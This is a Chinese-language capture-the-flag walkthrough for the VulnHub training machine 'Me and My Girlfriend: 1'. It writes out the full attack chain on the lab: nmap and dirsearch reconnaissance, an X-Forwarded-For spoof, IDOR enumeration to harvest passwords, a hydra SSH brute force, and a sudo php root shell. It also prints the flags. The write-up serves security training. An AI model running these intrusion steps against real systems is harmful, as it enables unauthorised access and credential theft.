# Me and My Girlfriend: 1

## 一、描述

```text
VM名称：Me and My Girlfriend: 1
下载（镜像）：https://download.vulnhub.com/meandmygirlfriend/Me-and-My-Girlfriend-1.ova
描述：这个VM告诉我们，有一对恋人，即Alice和Bob，这对夫妻本来很浪漫，但是自从Alice在一家私人公司“ Ceban Corp”工作以来，爱丽丝对鲍勃的态度发生了一些变化 是“隐藏”的，而鲍勃（Bob）寻求您的帮助，以获取爱丽丝（Alice）隐藏的内容并获得对该公司的完全访问权限！ 
难度级别：初学者
注意：有2个Flag。 
简单特权升级（提权）
```

## 二、开始训练

开启靶机环境

![image-20210312140650507](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312140650507.png)

使用nmap扫描子网，寻找靶机IP

```text
nmap -sP 192.168.1.0/24
```

![image-20210312140820792](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312140820792.png)

发现靶机IP

使用该IP对此网站进行详细扫描

```text
nmap -A 192.168.1.228
```

![image-20210312142721177](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312142721177.png)

没有发现什么比较直观的信息

使用dirsearch.py进行目录扫描

```text
dirsearch.py -u http://192.168.1.228/ -e*
```

发现robots.txt页面

![image-20210312142854690](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312142854690.png)

里面有一个txt文件

![image-20210312142949699](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312142949699.png)

打开后是一段提示，似乎没什么用处

![image-20210312142700851](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312142700851.png)

打开网站，如下图所示

![image-20210312140844996](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312140844996.png)

提示只能在本地访问，查看源代码

![image-20210312141005682](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141005682.png)

发现一行注释，提示使用x-forwarded-for

使用该插件将ip改为127.0.0.1

![image-20210312141124109](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141124109.png)

刷新后，成功打开网站

显示如下

![image-20210312141203919](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141203919.png)

发现有登陆界面

![image-20210312141611979](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141611979.png)

尝试使用admin，passwd登陆失败

尝试注册

![image-20210312141547884](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141547884.png)

注册信息

```text
用户名：admin
密码：admin
```

使用该信息登陆

![image-20210312141734195](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312141734195.png)

登陆成功

转到Profile，可以看到账号密码的信息

并且url中出现了个user\_id参数

源代码中就有隐藏的密码

![image-20210312143729764](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312143729764.png)

经查询，当看到user\_id这种参数出现，有可能是越权漏洞

准备遍历user\_id参数，我们注册后，user\_id为12

猜测其他用户就是1-11，使用burp进行遍历。

![image-20210312144044135](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312144044135.png)

果然得到了用户名及密码

![image-20210312144107169](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312144107169.png)

发现一共有六个账户

```text
eweuhtandingan    skuyatuh
aingmaung        qwerty!!!
sundatea        indONEsia
sedihaingmah    cedihhihihi
alice            4lic3
abdikasepak        dorrrrr
```

利用hydry，使用刚才得到的账号密码作为字典进行爆破SSH。

```text
hydra -L users.txt -P pass.txt ssh://192.168.1.228
```

![image-20210312145007633](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145007633.png)

![image-20210312145055284](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145055284.png)

成功爆破出ssh的用户名和密码

```text
[ssh] host: 192.168.1.228   login: alice   password: 4lic3
```

使用CRT进行SSH连接

![image-20210312145240998](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145240998.png)

![image-20210312145308247](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145308247.png)

连接成功

![image-20210312145328255](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145328255.png)

在/home/.my\_secret/下发现flag1.txt

![image-20210312145605150](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145605150.png)

```text
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

还发现了一个note

![image-20210312145754602](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312145754602.png)

```text
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
```

提示了一些信息，并提到了最后的flag在root目录中

尝试进入root目录

![image-20210312150006696](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312150006696.png)

没有权限，开始准备提权

使用该命令查看root信息

```text
sudo -l
```

![image-20210312150140092](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312150140092.png)

发现php无需root密码即可执行root命令

使用如下命令进行提权

```text
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

![image-20210312150434155](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312150434155.png)

成功提权

进入root目录查看最后的flag

![image-20210312150554790](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210312150554790.png)

```text
Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```

靶机训练结束

